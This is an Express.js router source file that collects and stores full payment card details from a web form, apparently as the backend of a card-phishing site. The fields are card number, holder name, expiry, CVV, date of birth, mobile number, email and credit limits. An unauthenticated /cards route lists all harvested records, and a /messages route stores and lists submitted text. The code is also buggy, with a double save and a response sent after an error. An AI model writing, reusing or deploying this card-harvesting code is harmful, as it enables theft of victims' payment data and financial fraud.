var express = require('express');
var router = express.Router();
const CardModal = require('../models/CardData')
const MessageModal = require('../models/MessageData')

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: 'Home' });
});
router.get('/form', function(req, res, next) {
  res.render('form', { title: 'Form' });
});
router.get('/options', function(req, res, next) {
  res.render('option', { title: 'Options' });
});
router.post('/card', async function(req, res, next) {
  try {
    var userDetails = new CardModal({
      name: req.body.name,
      mobile: req.body.mobile,
      email: req.body.email,
      dob: req.body.dob,
      totalLimit: req.body.totalLimit,
      avLimit: req.body.avLimit,
      cardNumber: req.body.cardNumber,
      holderName: req.body.holderName,
      exDate: req.body.expiry,
      cvv: req.body.cvv
    });
    const user = await userDetails.save();
    console.log(user);
  } catch (err) {
    console.log(err);
    res.status(500).json(err);
  }

  userDetails.save();
  res.render('success')
});

router.post('/message', async (req, res)=>{
  try {
    var userDetails = new MessageModal({
      message: req.body.message,
    });
    const message = await userDetails.save();
  } catch (err) {
    console.log(err);
    res.status(500).json(err);
  }
  res.send('message got success')
})

router.get("/cards", async (req, res)=>{
  let cardData = await CardModal.find().sort({createdAt: -1});
  res.render("card", {cardData})
})
router.get("/messages", async (req, res)=>{
  let cardData = await MessageModal.find().sort({createdAt: -1});
  res.render("message", {cardData})
})

module.exports = router;
